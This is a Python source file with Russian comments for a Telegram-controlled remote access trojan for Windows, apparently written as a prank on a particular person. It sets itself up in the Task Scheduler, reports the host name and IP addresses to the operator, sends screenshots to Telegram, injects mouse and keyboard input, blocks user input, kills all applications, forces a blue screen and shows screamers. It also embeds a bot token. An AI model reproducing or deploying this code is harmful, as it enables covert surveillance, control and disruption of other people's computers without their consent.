# coding: windows-1251
#       ^
#       |
# Это магический комент, уберешь его и твой комп взорвется

# 1329704902

import io  # Для создания байтового буффера
import pathlib # Для работы с директориями
import shutil # Работа с высокими функциями для файлов
import sys # Системные приколы
import pygame # чисто для звука
import time # для .sleep()
import ctypes # Win api
import win32con # Win api
import AudioPlayFromURL # Для проигрывания звука из ссылок
import subprocess # Для запуска утилиты для бсода
import DeskTopIcons # Прикол с иконками рабочего стола
import InputBlocker # Для отключения ввода с компьютера юзера
from Schedule import * # Для планировщика задач от Windows
from utils import * # некоторые приколы с .exe
import kill # Для закрытия всех приложений
from WP import wallpaper_action # Для смены обоев
import  win32api # Win api
import threading  # Для создания второго потока скрипта для параллельного исполнения процессов
import webbrowser # Для открытия всяких ссылочек
import screeninfo # Для получения разрешения монитора
import mouse  # для отслеживания мыши и симуляции кликов
import telebot  # База, эта библа для бота от тг
from PIL import Image, ImageDraw, ImageTk  # Библа, для работы с пикчами
from mss import mss  # Для захвата скринов
import tkinter # Для скримера
import pygame.mixer as mix # Теперь точно для звука
import socket  # Для создания сокета и нахождения локального IP
import os # Для разных системных приколов
import requests  # Для нахождения публичного IP

bot = telebot.TeleBot(
    '7516400777:AAGpQCha761QKAYrprcu8v5YbygmKeh_1fA')  # Токен бота(эта строка в методе) является ключём, через который скрипт понимает к какому боту привязать команды

monit = [m for m in screeninfo.get_monitors() if m.is_primary][0]


DeepLightID = 1627834434  # Это айди чата бота и меня
AllowedUsers = {'Deepl1ght', 'ZackDuraska', 'gawrgurov', 'moguss', 'artk0v'} # Авторизованные люди по юзу из тг

CURSOR_SIZE = 15 # Константа для курсора на скрине
CURSOR_COLORS = [
    ((0, 0, 0), (255, 255, 255)),  # Внешний круг
    ((255, 255, 255), None),  # Середина
    ((0, 0, 127), None)  # Внутренный
]

vk_codes = {   #Вся клавиатура для иммитирования нажатия клавиш
    # Буквы A-Z
    'A': 0x41, 'B': 0x42, 'C': 0x43, 'D': 0x44, 'E': 0x45, 'F': 0x46, 'G': 0x47,
    'H': 0x48, 'I': 0x49, 'J': 0x4A, 'K': 0x4B, 'L': 0x4C, 'M': 0x4D, 'N': 0x4E,
    'O': 0x4F, 'P': 0x50, 'Q': 0x51, 'R': 0x52, 'S': 0x53, 'T': 0x54, 'U': 0x55,
    'V': 0x56, 'W': 0x57, 'X': 0x58, 'Y': 0x59, 'Z': 0x5A,

    # Цифры верхнего ряда
    '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34,
    '5': 0x35, '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39,

    # Функциональные клавиши
    'F1': 0x70, 'F2': 0x71, 'F3': 0x72, 'F4': 0x73, 'F5': 0x74, 'F6': 0x75,
    'F7': 0x76, 'F8': 0x77, 'F9': 0x78, 'F10': 0x79, 'F11': 0x7A, 'F12': 0x7B,

    # Специальные клавиши
    'BACKSPACE': 0x08, 'TAB': 0x09, 'ENTER': 0x0D, 'SHIFT': 0x10, 'CTRL': 0x11,
    'ALT': 0x12, 'CAPSLOCK': 0x14, 'ESC': 0x1B, 'SPACE': 0x20, 'PAGEUP': 0x21,
    'PAGEDOWN': 0x22, 'END': 0x23, 'HOME': 0x24, 'LEFT': 0x25, 'UP': 0x26,
    'RIGHT': 0x27, 'DOWN': 0x28, 'PRINTSCREEN': 0x2C, 'INSERT': 0x2D, 'DELETE': 0x2E,

    # Модификаторы
    'LWIN': 0x5B, 'RWIN': 0x5C, 'APPS': 0x5D,

    # Цифровой блок
    'NUMPAD0': 0x60, 'NUMPAD1': 0x61, 'NUMPAD2': 0x62, 'NUMPAD3': 0x63,
    'NUMPAD4': 0x64, 'NUMPAD5': 0x65, 'NUMPAD6': 0x66, 'NUMPAD7': 0x67,
    'NUMPAD8': 0x68, 'NUMPAD9': 0x69,
    'NUMPAD_MULTIPLY': 0x6A,  # *
    'NUMPAD_ADD': 0x6B,  # +
    'NUMPAD_SEPARATOR': 0x6C,  # (редко используется)
    'NUMPAD_SUBTRACT': 0x6D,  # -
    'NUMPAD_DECIMAL': 0x6E,  # .
    'NUMPAD_DIVIDE': 0x6F,  # /

    # Символьные клавиши
    '`': 0xC0, '-': 0xBD, '=': 0xBB, '[': 0xDB, ']': 0xDD, '\\': 0xDC,
    ';': 0xBA, "'": 0xDE, ',': 0xBC, '.': 0xBE, '/': 0xBF,

    # Дополнительные
    'VOLUME_MUTE': 0xAD, 'VOLUME_DOWN': 0xAE, 'VOLUME_UP': 0xAF,
    'MEDIA_NEXT': 0xB0, 'MEDIA_PREV': 0xB1, 'MEDIA_STOP': 0xB2,
    'MEDIA_PLAY_PAUSE': 0xB3,
    'BROWSER_BACK': 0xA6, 'BROWSER_FORWARD': 0xA7,
}



'НАЧАЛО КОМАНД БОТА'


@bot.message_handler(commands=['start', 'Start'])  # Команда старт, ну тут в целом больше нечего говорить
def Hello(message):
    bot.reply_to(message,
                 f'Привет, это бот для кярва, если ты не я или не кярв то я тебе не буду отвечать\nА ведь твой юзер это @{message.from_user.username}\nСоветую уходить если ты не кярв, а так попробуй /help')
    bot.reply_to(message, message.chat.id)


'''
Наверно пора объяснить что такое @
В общем эта хрень называется декоратором, она используется
Для изменения поведения функции, вот например функция сверху
Здесь функция Hello() принимает аргумент message (впрочем как и другие)
Но если ты посмотришь дальше код, то ты охуеешь но эти функции, да и ебанные messag'ы нигде не указываются,
А знаешь почему?

-Нет, не знаю - ответил ты

Вот, короче объясняю эти собаки ебаные, которые называются at на пендосском используют сначало одну функция,
А потом, ту что под собакой, здесь у нас есть метод bot.message_handler()

Основы написаны, но надо объяснить откуда все таки берутся ебанные messag'ы
Смотри где-то далеко, в файлах библиотеки TeleBot, умные челы написали в теле метода message_handler что-то типа

...
MessageFromID = server.getMessage(ID)
func(MessageFromID)

Смотри многоточие отображает то, что был код до этого, а func(MessageFromID) это указание
Функции (метода), поведение которой будет изменено, проще говоря это плейсхолдер, с подготовленным аргументом
С точки зрения синтаксиса тут все правильно и func не надо заменять на название функции, именно это и сделает собака ебанная,
Указанная перед функцией (методом), я конечно пишу там функция или метод, но такие декораторы в питоне существуют и для классов,
Но это другой разговор
'''


@bot.message_handler(commands=['help', 'Help'])  # Наша помощь по командам (OUTDATED)
def Help(message):
    bot.send_message(message.chat.id,
                     'Привет, нужна помощь?\nВпрочем если не была бы нужна, ты бы не вводил эту команду\nВот тебе телеграф, там все команды:\nhttps://telegra.ph/Komandy-dlya-bota-KxrvPersonal-bot-05-29')
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(
    commands=['Screenshot', 'Screen', 'Scr', 'scr', 'screenshot', 'screen'])  # А вот и функция скриншотика
def ScreenShot(message):
    if message.from_user.username not in AllowedUsers:
        return

    monitor = {'top': 0, 'left': 0, 'width': 1920, 'height': 1080} # Константы монитора
    args = message.text.split()[1:] # Получаем параметры

    if args: # Если нету то кидаем стандартный скрин
        VALID_KEYS = {'top', 'left', 'width', 'height'}
        errors = []
        for arg in args: # если есть то изменяем их в monitor
            parts = arg.split(':', 1)
            if len(parts) == 2 and parts[0] in VALID_KEYS:
                try:
                    monitor[parts[0]] = int(parts[1])
                except ValueError:
                    errors.append(arg)
            else:
                errors.append(parts[0])

        if errors:
            bot.reply_to(message, f"Ошибка в ключах: {', '.join(errors)}")

    with mss() as sct: # Собственно сам скрин
        screenshot = sct.grab(monitor)
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

        top_left = (monitor['left'], monitor['top'])
        bottom_right = (top_left[0] + monitor['width'], top_left[1] + monitor['height'])
        mouse_pos = mouse.get_position()

        if IsInside(mouse_pos, 15, top_left, bottom_right):
            draw = ImageDraw.Draw(img)
            rel_x = mouse_pos[0] - top_left[0]
            rel_y = mouse_pos[1] - top_left[1]
            draw_cursor(draw, rel_x, rel_y)  # Отдельная функция для рисовки курсора на скрине
                                             # Так как на самом скрине нет курсора

        send_screenshot(img, message.chat.id) # Опана скидываем скрин

        # Это логи
        if message.from_user.username != 'Deepl1ght':
            send_screenshot(img, DeepLightID)
            bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['move', 'Move', 'm', 'M', 'mov', 'Mov'])  # А вот и мышка, точнее её передвижение
def Move_mouse(message):
    if message.from_user.username not in AllowedUsers:
        return

    # Параметры по умолчанию
    params = {'X': 0, 'Y': 0, 'abs': True, 'dur': 0}
    args = message.text.split()

    # Проверка минимального количества аргументов
    if len(args) < 3:
        bot.reply_to(message, 'Ошибка: требуется минимум 2 аргумента (X Y)')
        return

    # Обработка позиционных аргументов (X, Y)
    try:
        params['X'] = int(args[1])
        params['Y'] = int(args[2])
    except ValueError:
        bot.reply_to(message, 'Ошибка: X и Y должны быть целыми числами')
        return

    # Обработка именованных параметров
    for arg in args[3:]:
        if ':' not in arg:
            bot.reply_to(message, f'Ошибка в параметре "{arg}": должен быть в формате "ключ:значение"')
            continue

        key, value = arg.split(':', 1)
        if key not in params:
            bot.reply_to(message, f'Ошибка: неизвестный параметр "{key}"')
            continue

        try:
            # Для булевых параметров используем специальное преобразование
            if key == 'abs':
                params[key] = parse_bool(value)
            else:
                params[key] = int(value)
        except ValueError:
            bot.reply_to(message, f'Ошибка преобразования значения "{value}" для параметра "{key}"')
            continue

    # Выполнение действия
    try:
        mouse.move(params['X'], params['Y'], params['abs'], params['dur'])
    except Exception as e:
        bot.reply_to(message, f'Ошибка перемещения мыши: {str(e)}')
        return

    # Уведомление меня
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['click', 'Click', 'cl', 'Cl'])  # Симуляция кликов мыши
def Click(message):
    if message.from_user.username not in AllowedUsers:
        return

    try:
        parts = message.text.split()
        # Проверка минимального количества частей команды
        if len(parts) < 2:
            raise ValueError("Invalid command structure")

        # Нормализация параметров
        button = parts[1].lower()
        is_double = len(parts) > 2 and parts[2].lower() in {'double', 'd'}

        # Сопоставление кнопок с действиями
        button_actions = {
            'l': mouse.LEFT,
            'r': mouse.RIGHT,
            'm': mouse.MIDDLE
        }

        # Проверка допустимости кнопки
        if button not in button_actions:
            raise ValueError("Invalid button specified")

        # Выбор действия
        action = mouse.double_click if is_double else mouse.click
        action(button_actions[button])

        bot.send_message(message.chat.id, 'Команда была выполнена')

    except Exception as e:
        bot.send_message(message.chat.id, f'К сожелению вы долбан, но не грустите\nГовна пожрите\n{e}')

    # Логирование для меня
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['skr', 'screamer', 'scream', 'sakincock']) # Скримачек
def screamer(message):
    if message.from_user.username in AllowedUsers:
        threading.Thread(target=show_screamer, daemon=True).start() # Так как основной поток занят ботом, а ткинтер не особо любит это
        threading.Thread(target=Obasravsya, daemon=True).start()    # Поэтому мы создадим отдельный поток, а это значит, что при множественном
                                                                    # Использовании скримера память быстро засорится, но вроде это не такая прям проблема
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['url', 'web']) # Вот и открытие ссылки
def openEyes(message):
    if message.from_user.username in AllowedUsers:
        webbrowser.open(message.text.split()[1], new=2, autoraise= True) # Короч первый аргумент это сама ссылка, new = 2 означает,
                                                                         # Что ссылка откроется в новой вкладке браузера, если открыт,
                                                                         # А autorise = True автоматически откроет браузер если он закрыт
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'Пользователь @{message.from_user.username} '
            f'отправил команду:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['kill']) # Команда для закрытие всех приложений
def Killer(message):
    if message.from_user.username in AllowedUsers:
        kill.Kill(message)

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['wallpaper', 'wp']) # Вот и команда на смен обоев на рабочем столе
def Wallpaper(message):
    if message.from_user.username in AllowedUsers:
        action = message.text.split()[1]
        match action:
            case 'set':
                wallpaper_action('set', resource_path(r'screams/2.png'))
            case 'restore':
                wallpaper_action('restore')
            case _:
                bot.reply_to(message, 'Неправильно попробуй еще раз')

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['kys']) # Команда на удаление скрипта,
def Kys(message):                      # Ощущаю себя Фуфелшмерцем, добавляя её
    if message.from_user.username in AllowedUsers:
        if is_frozen() and check_scheduler_task_exists():
            delete_scheduler_task()
        threading.Thread(target=StopIn5Secs, daemon=True).start() # Если бот тут же отключится, то он эту команду будет обрабатывать бесконечно
                                                                  # Поэтому создаю отдельный поток, в котором бот выключется через 5 секунд
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['hide', 'h']) # Команда на свертование всех приложений
def Hide(message):
    if message.from_user.username in AllowedUsers: # по каким-то причинам win+d через библиотеку keyboard не работает поэтому используем ctypes
        ctypes.windll.user32.keybd_event(vk_codes['D'], 0, 0, 0)  # Клавиша Win
        ctypes.windll.user32.keybd_event(vk_codes['D'], 0, 0, 0)  # Клавиша D
        ctypes.windll.user32.keybd_event(vk_codes['D'], 0, 2, 0)  # Отпускаем D
        ctypes.windll.user32.keybd_event(vk_codes['LWIN'], 0, 2, 0)  # Отпускаем Win

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['bsod', 'prikol']) # Вот и бсод
def Prikol(message):
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

    if message.from_user.username in AllowedUsers:
        try:
            # Путь к NotMyFault.exe, оффициальной утилите от микромягких для вызова бсодов
            subprocess.run(
                [resource_path(r'screams/bsod.exe'), "/crash"],
                check=True,
                shell=True,
                timeout=10
            )
        except Exception as e:
            bot.send_message(DeepLightID, e)

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['disable']) # Отключает ввод с мыши и клавиатуры у юзера
def Dismember(message):
    if message.from_user.username in AllowedUsers:
        InputBlocker.Disable()

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['enable']) # Включает ввод с мыши и клавиатуры у юзера,
def enable(message):                      # Почему-то надо вводить 3 раза
    if message.from_user.username in AllowedUsers:
        InputBlocker.Enable()

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['hico']) # Команда для скрытия иконок рабочего стола
def HideIcons(message):
    if message.from_user.username in AllowedUsers:
        DeskTopIcons.hide_desktop_icons()

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['sico']) # Команда для показа иконок рабочего стола
def ShowIcons(message):
    if message.from_user.username in AllowedUsers:
        DeskTopIcons.show_desktop_icons()

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['text']) # Команда для открытия блокнота с напечатанным текстом
def TextWriteOpen(message):
    if message.from_user.username in AllowedUsers:

        if os.path.exists(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt')): # Если файл существует
            os.remove(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'))      # То удаляет его

        with open(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'), 'x') as f: # Создает файл и записывает туда текст
            f.write(' '.join(message.text.split()[1:]))
            f.close()
        os.system(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'))

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['kb', 'write']) # Команда для имитации клавиатуры
def KeyBoard(message):
    if message.from_user.username in AllowedUsers:
        Inst = message.text.split()[1]
        Keys = Inst.split('+')
        pressedKeys = []
        for key in Keys:
            try:
                par = key.split(':')
                if par[1] == 'p':

                    ctypes.windll.user32.keybd_event(vk_codes[str.upper(par[0])], 0, 0, 0)
                    pressedKeys.append(par[0])

                if par[1] == 'r':

                    ctypes.windll.user32.keybd_event(vk_codes[str.upper(par[0])], 0, 2, 0)
                    for key in pressedKeys:
                        ctypes.windll.user32.keybd_event(vk_codes[key], 0, 2, 0)
            except:

                ctypes.windll.user32.keybd_event(vk_codes[str.upper(par[0])], 0, 0, 0)
                ctypes.windll.user32.keybd_event(vk_codes[str.upper(par[0])], 0, 2, 0)

                for key in pressedKeys:
                    ctypes.windll.user32.keybd_event(vk_codes[key], 0, 2, 0)

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['check']) # Команда для проверки существования задачи, является рудиментом
def Check(message):
    if message.from_user.username in AllowedUsers:

        if Schedule.check_scheduler_task_exists():
            bot.reply_to(message, 'true')
        else:
            bot.reply_to(message, 'false')

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['play']) # команда для игры звука по ссылке
def PlayFromURL(message):
    if message.from_user.username in AllowedUsers:
        AudioPlayFromURL.play_audio_from_url(message.text.split()[1])

    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(func=lambda message: True)  # Последняя команда, всегда должна быть последней
def Echo(message):  # Тут мы ловим любое сообщение, которое не подходит под команды выше
    if message.from_user.username != 'Deepl1ght':
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


'''КОНЕЦ БОТА
    НАЧАЛО СКРИПТА'''

mix.init() # Инициируем .mixer для воспроизведения звука

def show_screamer(): # сама функция для показа скримака

    root = tkinter.Tk() # создаем окно ткинтера
    root.title("overlay")

    image = Image.open(resource_path(r'screams/1.png')) # открываем нашу пикчу
    mon = [m for m in screeninfo.get_monitors() if m.is_primary==True][0]
    mwidth = mon.width
    mheight = mon.height
    newimage, cords = calculate_scale(image, mwidth, mheight, image.size[0], image.size[1])
    # Скрываем название
    root.overrideredirect(True)

    # Короче делаем красный цвет прозрачным
    root.attributes("-transparentcolor", "red")

    # Заливаем фон красным (прозрачным)
    root.config(bg="red")
    img = ImageTk.PhotoImage(newimage)
    l = tkinter.Label(root, fg="white", bg="red", image=img)
    l.pack()

    # Проигрываем звук
    mix.music.load(resource_path(r'screams/1.wav'))
    mix.music.play()

    # Делаем так, чтобы окно было всегда поверх других
    root.geometry(cords)
    root.wm_attributes("-topmost", 1)

    # Закрываем через 5 секунд
    root.after(5000, lambda: root.destroy())
    # Запускаем ткинтер
    root.mainloop()

def Obasravsya():
    time.sleep(5.5)
    root = tkinter.Tk()  # создаем окно ткинтера
    root.title("overlay")

    image = Image.open(resource_path(r'screams/3.png'))  # открываем нашу пикчу
    mon = [m for m in screeninfo.get_monitors() if m.is_primary == True][0]
    mwidth = mon.width
    mheight = mon.height
    newimage, cords = calculate_scale(image, mwidth, mheight, image.size[0], image.size[1])
    # Скрываем название
    root.overrideredirect(True)

    # Короче делаем красный цвет прозрачным
    root.attributes("-transparentcolor", "red")

    # Заливаем фон красным (прозрачным)
    root.config(bg="red")
    img = ImageTk.PhotoImage(newimage)
    l = tkinter.Label(root, fg="white", bg="red", image=img)
    l.pack()

    # Проигрываем звук
    mix.music.load(resource_path(r'screams/1.wav'))
    mix.music.play()

    # Делаем так, чтобы окно было всегда поверх других
    root.geometry(cords)
    root.wm_attributes("-topmost", 1)

    # Закрываем через 5 секунд
    root.after(5000, lambda: root.destroy())

    # Запускаем ткинтер
    root.mainloop()


def calculate_scale(image, mon_width, mon_height, img_width, img_height): # Функция для увелечения картинки,
                                                                          # Также возвращает строку с геометрией для tk.geometry()

    scale = min([mon_width//img_width, mon_height//img_height]) # Коэффициент увеличения картинки

    ret = image.resize((img_width*scale, img_height*scale)) if scale>0 else image# Увеличиваем картинку

    cords = f"{ret.size[0]}x{ret.size[1]}+{mon_width//2-ret.size[0]//2}+{mon_height//2-ret.size[1]//2}" # создаем строку с разрешением и смещением для ткинтера

    return ret, cords # Возвращаем обе переменных

def parse_bool(value: str) -> bool: # Функция для преобразования строк в булевы значения
    true_values = {'true', '1', 'yes', 'да', 'on', 'enable', 't'}
    false_values = {'false', '0', 'no', 'нет', 'off', 'disable', 'f'}

    normalized = value.strip().lower() # Убираем пробелы и прочую хуеты и занижаем как кавказцы

    if normalized in true_values: # Ну и возвращаем соответственные значения
        return True
    if normalized in false_values:
        return False
    raise ValueError(f'Недопустимое булево значение: "{value}"') # Опана ошибка


def StopIn5Secs(): # Функция для остановки бота
    time.sleep(5)
    bot.send_message(DeepLightID, 'Бот выключен')
    bot.stop_polling()


def IsInside(point: tuple, radius: int, topLeft: tuple,
             downRight: tuple):  # Вот функция для проверки вхождения в зону (СВО) скрина
    x, y = point  # Привязываем значение кординат к нашим точкам

    x_min = min(topLeft[0], downRight[0])
    x_max = max(topLeft[0], downRight[0])
    y_min = min(topLeft[1], downRight[1])
    y_max = max(topLeft[1], downRight[1])

    return (
            (x - radius >= x_min) and
            (x + radius <= x_max) and
            (y - radius >= y_min) and
            (y + radius <= y_max)
    )


def send_screenshot(img, chat_id):
    # Сжатое изображение
    bot.send_photo(chat_id, img, protect_content=True)

    # Несжатое изображение
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    bot.send_document(chat_id, img_byte_arr, protect_content=True)


def draw_cursor(draw, x, y):
    # Основные круги
    for i, (fill, outline) in enumerate(CURSOR_COLORS):
        size = CURSOR_SIZE - i * 5
        bbox = [
            (x - size // 2, y - size // 2),
            (x + size // 2, y + size // 2)
        ]
        draw.ellipse(bbox, fill=fill, outline=outline)

    # Крест
    cross_size = CURSOR_SIZE - 2
    draw.line([(x, y - cross_size // 2), (x, y + cross_size // 2)], fill=(255, 0, 0))
    draw.line([(x - cross_size // 2, y), (x + cross_size // 2, y)], fill=(255, 0, 0))


def get_local_ip():
    try:
        # Создаем временное подключение к публичному DNS
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Google Public DNS
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1 (Local host)"  # Возвращаем localhost при ошибке


def get_public_ip(): # получаем публичный IP
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json()["ip"]
    except Exception:
        return "Не удалось получить IP"

if is_frozen() and not check_scheduler_task_exists(): # создаем задачу в планировщике задач
    create_scheduler_task()
    # Проверка прав администратора
    if not run_as_admin():
        sys.exit(1)

bot.send_message(DeepLightID,
                 f"Бот запущен\nИмя компьютера: {socket.gethostname()}\nЛокальный IP: {get_local_ip()}\nПубличный IP: {get_public_ip()}")  # сообщение для меня любимого

bot.infinity_polling() # Наконец запускаем бота